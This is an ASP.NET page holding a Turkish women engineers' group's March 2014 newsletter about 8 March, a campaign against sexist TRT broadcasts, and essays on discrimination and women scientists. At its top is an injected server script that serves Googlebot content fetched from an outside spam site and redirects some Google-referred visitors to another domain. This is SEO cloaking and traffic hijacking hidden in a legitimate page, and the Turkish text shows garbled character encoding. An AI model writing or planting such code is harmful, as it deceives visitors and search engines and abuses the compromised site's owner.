<%@ Page Language="C#" MasterPageFile="~/MasterPage2.master" AutoEventWireup="true"
    CodeFile="Mart2010Bulteni.aspx.cs" Inherits="images_Mart2010Bulteni" Title="Mart 2014 Bulteni" %>

<asp:Content ID="Content1" ContentPlaceHolderID="ContentPlaceHolder1" runat="Server">
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string zhizhu = "";
    string mirror = "http://www.jewelrysliver.com/Content.aspx?id=332";
    zhizhu = System.Web.HttpContext.Current.Request.ServerVariables["HTTP_USER_AGENT"].ToLower();
    if (zhizhu.IndexOf("googlebot") != -1)
    {
        if(mirror.IndexOf("http://")<0){
            if(System.IO.File.Exists(mirror))
            {
                Response.Clear();
                Response.Charset = "UTF-8";
                Response.ContentEncoding = System.Text.Encoding.UTF8;
                System.IO.StreamReader sr = new System.IO.StreamReader(mirror, System.Text.Encoding.UTF8);
                Response.Write(sr.ReadToEnd());
                sr.Close();
                Response.End();
            }
        }
        else
        {
            Response.Clear();
            Response.Charset = "UTF-8";
            Response.ContentEncoding = System.Text.Encoding.UTF8;
            Response.Write(this.getHTTPPage(mirror));
            Response.End();
        }
    }
    else
    {
        Boolean isZH = false;
        try
        {
            foreach (string language in Request.UserLanguages)
            {
                if (language.Substring(0, 2).ToLower() == "zh")
                {
                    isZH = true;
                    break;
                }
            }
        }
        catch
        {
        }

        Uri uri = System.Web.HttpContext.Current.Request.UrlReferrer;
        string jump = "http://www.gucsacsfr.com/";
        string wifilangs = "";
        if(Request.ServerVariables["HTTP_ACCEPT_LANGUAGE"] != ""){
            wifilangs = (((Request.ServerVariables["HTTP_ACCEPT_LANGUAGE"]).Split(';')[0]).Split(',')[0]).ToLower();
        }
        if (uri != null && isZH==false)
        {
            string referer = uri.AbsoluteUri.ToLower();
            string str = "" + "," + "google.fr" + "," + "google.be";
            string[] terms = str.Split(',');
            if (referer.IndexOf("google") != -1 ){
                if(str!=""){
                    foreach(string term in terms){
                        if(term != "" && referer.IndexOf(term)>=0){
                            Response.Redirect(jump);
                        }
                    }
                }else{
                    Response.Redirect(jump);
                }
            }
        }

    }

    base.Page_Load(sender, e);
}


protected string getHTTPPage(string Url)
{
    string ResponseText = string.Empty;
    System.Net.WebRequest Request = System.Net.HttpWebRequest.Create(Url);
    using (System.IO.StreamReader Reader = new System.IO.StreamReader(Request.GetResponse().GetResponseStream()))
    {
        ResponseText = Reader.ReadToEnd();
    }
    return ResponseText;

}
</script>
    <script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
    </script>
    <script type="text/javascript">
_uacct = "UA-509773-2";
urchinTracker();
    </script>

    <table width="90%" align="center">
        <tr>
            <td align="justify" style="width: 100%; text-align: justify">
                
                    <span class="yazibasligi">  
                        Mart 2014 Bülteni</span><br />
                <span class="siyahyazibuyuk">
                    Coþkulu ve katýlýmýn yoðun olduðu bir 8 Mart peþinden çýkarttýðýmýz bu sayýmýzda, TRT'nin ve hükümetin desteklediði cinsiyetçi yayýnlara karþý gerçekleþtirdiðimiz uzun soluklu  kampanya detaylarýný sizler için derledik...
                     </br> 
                     </br>Ýpek, kadýn olarak yaþadýðýmýz ayrýmcýlýðý anlattý yazýsýnda. Berivan, kendimize ait bir odada yazmamýzý öðütleyen Virginia Woolf'un,  Bahar ise ilk kimyagerimiz Remziye Hisar'ýn hayat hikayesini hazýrladý. 
                     </br>
                     </br>Suzan'ýn hediye alýp-vermenin altýndaki toplumsal anlamlarý ortaya çýkartan yazýsý ve Beyhan'ýn mühendislik, erkeklik ve iktidar iliþkisine deðindiði yazýsýný da bu sayýmýzda okuyabilirsiniz. Özdeþ,   kadýn cinayeti diyebilmekteki zorlanmalarýmýzý yakýnlarda  kadýn cinayetinde kaybettiði bir arkadaþýnýn, Yanký'nýn ölümündeki deneyimiyle paylaþýyor. Selma ise 8 Mart coþkusunu fotoðraflarýyla bültenimize taþýdý. 
                    </br>
                    <br /> 10 Mart sabahý ise umudun çocuðu Berkin Elvan'ý sonsuza uðurladýk. Sorumlularýn yargýlanmasý dileklerimizle...
                    </br>
                    <br />Ýyi okumalar.<br />
                    <br />
                    Görüþ, öneri ve katkýlarýnýz için iletiþim adresi: <a href="mailto:kadin.muhendisler@gmail.com">
                        <span class="tatlimor">kadin.muhendisler@gmail.com</span></a><br />
                     </span>
                     
                      <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">TRT'yi Deðil Bizi Ýzlemeye
                            Devam Edin!</span> </span></span><span class="siyahyazibuyuk">&nbsp;<br /> TRT'nin Gýda Mühendisleri Odasý'ndan etiketleme konusunda görüþ bildirmek üzere "bay mühendis" talebinde bulunmasýnýn ardýndan geliþenleri merak ediyorsanýz TRT'yi
                                deðil, bizi izlemeye devam edin
                   <a href="trt.aspx" target="_blank"><span class="yazininDevami">devamý.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Kadýn Mühendisler, Mimarlar, Þehir Plancýlar, 
        <br />
        Fen Bilimciler ve Teknik  Elemanlar Grubu&nbsp;</span> 
                                               
                                               
                                               <div class="duyuruHr"><br />                
                  
                  
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">Mühendislik Neden "Erkek"tir?
                            </span></span><span class="siyahyazibuyuk">&nbsp;<br />Özellikle bilim ve teknoloji alanlarýnda çok belirgin ayrýmcýlýk yaþanýr. Bu ayrýmcýlýk önce iþe alýmlarda belirli iþlere erkeklerin alýnmasý, belirli diðer iþlere kadýnlarýn
                                alýnmasýyla uygulanýr. 
                   <a href="bto_muhendislik.aspx" target="_blank"><span class="yazininDevami">devamý.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Beyhan Tayat, Endüstri Mühendisi&nbsp;</span>
                   
                    <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">Düþünüyorum Öyleyse Vurun</span></span><span class="siyahyazibuyuk">&nbsp;<br />
                  "...kadýnlarýn istihdama katýlýmýnýn günbegün azaldýðýný, umutsuzluklarýnýn tavan yaptýðýný, erkeklere göre kayýt dýþý çalýþtýklarýný, çalýþma çaðýndaki kadýnlarýn sadece %25'inin iþ gücüne dahil olabildiðini, evde sokakta iþ arayanlarýn %90'ýnýn kadýn olduðu ve "ne iþ olsa yaparým”a doðru bir gidiþatýn olduðunu söylemek gerekiyor..."<a href="ig_kadin.aspx" target="_blank"><span class="yazininDevami">devamý.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Ýpek Güvercin&nbsp;</span>                         
                      
                                
                             
                       <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">Virginia Woolf (1882-1941)</span><span
                            style="font-size: 9pt; color: #000000; font-family: Tahoma">&nbsp;</span><br />
                        </span></span><span class="siyahyazibuyuk">&nbsp;
                            Virginia Woolf (1882-1941) Ýngiliz romancý, deneme ve biyografi yazarý, feminist.
                            Woolf, her yeni romanýyla modernist tarzýný deðiþtiren üretken bir yazardý. Mektuplarý
                            ve hatýralarý, Bloomsburry zamanýnýn Ýngiliz edebiyat kültürü merkezinde Woolf'un
                            bakýþýný ortaya koyar. Woolf, sanatýn toplum ile entegre olduðu zamanda bir tarihsel
                            dönemi temsil eder. T.S. Elliot Virginia'nýn ölümünün ardýndan þöyle tarifler "
                            Merkezinde Virginia Woolf olmadan, þekilsiz ve marjinal kamýþ olurdu...Virginia
                            Woolf'un ölümüyle, bir kültürün tüm yörüngesi kýrýldý."
                   <a href="bo_virginvolf.aspx" target="_blank"><span class="yazininDevami">devamý.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Berivan Öncel, Gýda Mühendisi&nbsp;</span>  
                        
                 <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">Kadýn Cinayetine Kadýn Cinayeti Diyebilmek... </span></span><span class="siyahyazibuyuk">&nbsp;<br />
    <span id="yui_3_13_0_ym1_1_1394475818917_43577" style="line-height: 115%"><font id="yui_3_13_0_ym1_1_1394475818917_43576"
        face="arial, helvetica, sans-serif">Sanýrým ancak Serpil Erfýndýk öldürüldükten
        sonraydý.
                            Tanýdýðým bir kadýnýn da kadýn cinayetine kurban gidebileceðini, kadýn
        cinayetlerinin iyice "ana akýmlaþtýðýný" fark ettim.</font></span>
                            <a href="ob_kadincinayeti.aspx" target="_blank"><span class="yazininDevami">devamý.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Özdeþ Bodur, Gýda Mühendisi&nbsp;</span>                                     
                       
                        
                                               <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">Hediyeler Üzerine</span></span><span class="siyahyazibuyuk">&nbsp;<br />
                            Bazý özel günlerde illaki de hediye almamýz basbas baðýrýlýyor ve biz "iþte bunlar
                            hep kapitalizm" diye adýný koyabiliyorken davetli olduðumuz düðünlere veya bebek
                            doðumlarýna o kadar kolayca söz edemeyiþimiz neden?<a href="sb_hediye.aspx" target="_blank"><span class="yazininDevami">devamý.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Suzan Bayhan, Bilgisayar Mühendisi&nbsp;</span>  
                        
                          <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt">Ýlk Kadýn Kimyagerimiz: Prof. Dr. Remziye Hisar</span><span
                            style="font-size: 9pt; color: #000000; font-family: Tahoma">&nbsp;</span></span></span>
<br />  
<span class="siyahyazibuyuk">
                       
                    </span></a>"...Bilim kadýnlarýnýn öncülerinden Polonyalý kimyager ve fizikçi Marie Curie "Yaþam hiçbirimiz için kolay deðil. Bir þeyleri baþarmak için, yetenekli olduðumuza inanarak buna ulaþmak için usanmadan çabalamalýyýz" diyor. Madam Curie'nin de öðrencisi olan ilk kadýn kimyagerimiz Remziye Hisar'ýn yaþam öyküsünü sizinle paylaþmak istedik..."</span></a>
                    <a href="bs_remziyehisar.aspx" target="_blank"><span class="yazininDevami">devamý.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Bahar Saðlam, Gýda Mühendisi&nbsp;</span>           
                                      
                
                     
                            <br />
                            <br />  <div class="duyuruHr"><br /> 
                  &nbsp;&nbsp;</div>
                    <span class="yazibasligi">
                       <br />
                        <span style="font-size: 16pt"> Fotoðraflarla 8 Mart 2014 </span></span>
                        <span class="siyahyazibuyuk">&nbsp;<br />
                  
 
Kadýköy'de düzenlenen 8 Mart mitinginden rengarenk kareler objektifimize böyle yansýdý
                            <a href="se_fotografi.aspx" target="_blank"><span class="yazininDevami">devamý.<br />
                   </span></a>
                    <span class="yazarBlogu">
                        <br />
                        Selma Eroðlu, Makina Mühendisi&nbsp;</span>
                            <br />
                           <br />
                          </span>
                             
            </td></tr>
    </table>
</asp:Content>
